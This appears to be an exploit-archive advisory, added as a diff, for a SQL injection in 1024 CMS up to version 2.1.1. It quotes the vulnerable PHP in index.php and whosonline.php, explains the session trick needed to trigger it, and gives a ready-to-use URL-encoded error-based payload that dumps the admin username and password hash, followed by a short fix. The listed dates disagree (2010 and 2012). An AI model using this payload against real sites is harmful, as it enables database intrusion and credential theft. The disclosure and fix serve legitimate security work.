@@ -1,0 +1,89 @@
+id: 14030
+date: 09/07/2010
+title: 1024 CMS <= 2.1.1 SQL vulnerability
+author: Kallimero
+cves: 
+
+# Exploit Title: 1024cms <= 2.1.1 SQL vulnerability
+# Date: 21/08/2012
+# Exploit Author: Kallimero
+# Vendor Homepage: http://www.1024cms.org
+# Software Link: http://sourceforge.net/projects/cms-cvi/files/v2.1.zip/download
+# Version: 2.1.1
+# Tested on: Debian
+
+
+
+Introduction
+============
+
+
+1024 cms is vulnerable to a tricky SQL injection
+
+
+
+The vuln
+========
+
+
+First let's see the code :
+
+---------------[index.php]---------------
+
+if(!isset($_GET['p']) || trim($_GET['p']) == "") $page = $defaultpage;
+else $page = mb_strtolower($_GET['p']);
+ 
+$online_page = $page;
+
+---------------[index.php]---------------
+
+You see that it's possible to inject in the $online_page variable thanks to $_GET['p'];
+
+
+---------------[includes/classes/whosonline.php]---------------
+ligne 8:
+
+if(!isset($online_page) || $online_page == "") $location = $sitename;
+else $location = $online_page;
+$uid = $_SESSION['user'];
+$chk_user = mysql_query("SELECT ip FROM ".$prefix."online WHERE ip='".$ip."'") or die("WHOSONLINE::: Cannot check: ".mysql_error());
+if(mysql_num_rows($chk_user) > 0) mysql_query("UPDATE ".$prefix."online SET time='".$now."' WHERE ip='".$ip."'") or die("WHOSONLINE::: Cannot update user: ".mysql_error());
+else mysql_query("INSERT INTO ".$prefix."online (time, ip, username, location, uid) VALUES ('".$now."', '".$ip."', '".$username."', '".$location."', '".$uid."')") or die("WHOSONLINE::: Cannot insert user: ".mysql_error());
+
+---------------[includes/classes/whosonline.php]---------------
+
+w00t an SQL injection. $location isn't properly sanitarized.
+
+Its a bit tricky because to inject you have to be connected but not logged as an online user with your ip.
+The most simple solution is to log with an ip, then keep the cookies and inject with another.
+
+
+The PoC :
+=========
+
+Error based injection in INSERTO INTO :
+http://[site]/index.php?p=hwc%20rox%20modafucka%27,%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28SELECT%20concat%28username,%200x3a,%20password%29%20FROM%20otatf_users%20LIMIT%200,1%29,0x7e,%20floor%28rand%280%29*3%29%29%20as%20e%20from%20information_schema.tables%20group%20by%20e%29%20a%29%29--%20-
+
+And you normally see :
+WHOSONLINE::: Cannot insert user: Duplicate entry 'admin:[MD5 HASH]~1' for key 'group_key'
+
+
+How to Fix ?
+============
+
+
+To fix the vuln juste take this line of the index.php script :
+if(mb_eregi("[^[:space:]a-zA-Z0-9_.-]{1,}", $page)) die("PAGE FORMAT INCORRRECT");
+And put it before the whosonline.php inclusion.
+
+
+ Thanks
+=========
+
+Special thanks : Epicout
+All hwc members : Necromoine, fr0g, AppleSt0rm, St0rn, Zhyar, k3nz0.
+Please visit : http://orgasm.re/
+
+
+
+#  0day.today [2023-03-22]  #
